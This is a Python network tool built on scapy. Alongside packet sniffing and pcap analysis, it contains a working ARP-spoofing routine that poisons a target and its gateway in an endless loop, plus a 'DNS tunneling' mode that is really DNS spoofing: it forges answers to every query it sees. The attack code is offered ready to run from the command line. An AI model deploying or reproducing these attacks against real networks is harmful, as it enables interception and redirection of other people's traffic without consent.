import scapy.all as scapy
import argparse
import os
import sys
import threading
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR

def sniff_packets(interface):
    print(f"[*] Sniffing on {interface}... Press CTRL+C to stop.")
    scapy.sniff(iface=interface, store=False, prn=analyze_packet)

def analyze_packet(packet):
    if packet.haslayer(IP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        proto = packet[IP].proto

        if packet.haslayer(TCP) or packet.haslayer(UDP):
            print(f"[+] Packet: {ip_src} -> {ip_dst} | Protocol: {proto}")
        
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            queried_domain = packet[DNSQR].qname.decode()
            print(f"[DNS Query] {ip_src} -> {ip_dst} : {queried_domain}")

def arp_spoof(target_ip, gateway_ip, interface):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    print("[*] Starting ARP spoofing...")
    while True:
        send_arp_packet(target_ip, gateway_ip, target_mac)
        send_arp_packet(gateway_ip, target_ip, gateway_mac)

def send_arp_packet(target_ip, spoof_ip, target_mac):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def dns_tunnel(interface):
    print("[*] Starting DNS tunneling...")
    scapy.sniff(iface=interface, filter="udp port 53", store=False, prn=handle_dns)

def handle_dns(packet):
    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
        queried_domain = packet[DNSQR].qname.decode()
        print(f"[DNS Tunnel] Query: {queried_domain}")
        
        response_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, 
                              an=DNSRR(rrname=queried_domain, rdata="8.8.8.8"))
        scapy.send(response_packet, verbose=False)

def analyze_pcap(file):
    print(f"[*] Analyzing Wireshark capture file: {file}")
    packets = scapy.rdpcap(file)
    for i, packet in enumerate(packets, start=1):
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            proto = packet[IP].proto
            print(f"[+] Packet {i}: {ip_src} -> {ip_dst} | Protocol: {proto}")
        
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            queried_domain = packet[DNSQR].qname.decode()
            print(f"[DNS Query] {ip_src} -> {ip_dst} : {queried_domain}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-w", "--pcap", help="Analyze a Wireshark .pcap file")
    parser.add_argument("--sniff", action="store_true", help="Sniff network traffic")
    parser.add_argument("--arp", nargs=2, metavar=("TARGET", "GATEWAY"), help="Perform ARP spoofing")
    parser.add_argument("--dns", action="store_true", help="Start DNS tunneling")
    args = parser.parse_args()

    if args.pcap:
        analyze_pcap(args.pcap)
    elif args.interface:
        if args.sniff:
            sniff_packets(args.interface)
        elif args.arp:
            target_ip, gateway_ip = args.arp
            arp_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, args.interface))
            arp_thread.start()
        elif args.dns:
            dns_tunnel(args.interface)
        else:
            print("[-] No valid option selected. Use -h for help.")
            sys.exit(1)
    else:
        print("[-] No interface or .pcap file provided. Use -h for help.")
        sys.exit(1)

if __name__ == "__main__":
    main()
